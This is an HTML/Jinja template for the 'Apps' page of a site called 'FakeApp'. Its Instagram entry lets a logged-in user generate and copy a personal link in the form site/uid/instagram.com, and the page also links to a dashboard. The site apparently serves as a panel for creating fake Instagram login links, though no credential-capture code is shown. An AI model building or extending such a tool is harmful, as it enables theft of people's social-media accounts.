<!DOCTYPE html>
<html>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
    <title>Apps â€¢ FakeApp</title>
    <link rel="icon" type="image/x-icon" href="{{ url_for('static', filename='favicon.png')}}">
    <link rel='stylesheet' type="text/css" href="/static/nav.css">
   
    <script src="/static/nav.js"></script>   
   
   
     <script>
      function generateUrlForInsta()
        {
          document.getElementById('url').style.display='block';
            document.getElementById('url').value=(document.location.origin+'/'+document.getElementById('login_button').value+'/instagram.com');
            document.getElementById('copyUrl').style.display='block';
            document.getElementById("generate-url-btn").style.display='none'
          }
      


      function copyTOClipBoard(){
        var copyText = document.getElementById('url');

  copyText.select();
  copyText.setSelectionRange(0, 99999); /* For mobile devices */

   /* Copy the text inside the text field */
  navigator.clipboard.writeText(copyText.value);

  /* Alert the copied text */
  alert('Copied the text: ' + copyText.value);
      }
    </script>
    
    

    <style type="text/css">
      .list-service{

        list-style-type:none ;
        margin-left: 0px;
        padding-left: 0px;
        display: inline-block;
      }
      .list-service img{
        float: left;
      }
      .list-service h3{
        text-align: left;
        display: inline-block;
        padding: 0;
      }
      .list-service .urlclass {
        padding: 0;
      display: inline-flex;
      }
      #generate-url-btn{
        cursor: pointer;
      }
      
      
     </style>
    

   
</body>
    <body>
     
          



<div class="topnav" style="margin:auto;">

    <a  href="/">Home</a>
    <a class="active" href="/apps">Apps</a>
    <a  href="/dashboard">Dashboard</a>

    <div>
      <input type="submit" id="login_button" 
      style="background-color: bisque;
    float: right; cursor: pointer;"
      {% if isLogged == True %} value={{uid}}
      onclick="see_user()"
      
      {% else %}
      value="Login" onclick="login()"
      {% endif %}></input>
     
      <input type="submit"
      {% if isLogged == True %} value="Logout"
      style="float: right; cursor: pointer;"
      onclick="logout()"
      {% else %}
      style="display: none;"
      {% endif %}
      ></input>    
    </div>

  </div>

  


    <ul >
        <li class="list-service"  >
            <img src="/static/insta_icon.ico" onclick="generateUrlForInsta()" style="cursor: pointer; " width="60" height="60">
            <h3>Instagram</h3>
            <button id="generate-url-btn" onclick="generateUrlForInsta()">Generate your url</button>
          
            <div class="urlclass">
              <input type="text"  id="url" readonly hidden></input>
              <button id="copyUrl"  onclick="copyTOClipBoard()" hidden>Copy</button>
            </div>
        </li>
  
     
      
    </ul>
  </div>







  
    



  <footer style="position: fixed;text-align: center; bottom: 0; width: 100%; border: 5px solid rgb(36, 156, 186);">
<h2>Contact Us</h2>
 </footer> 
</body>
</html>
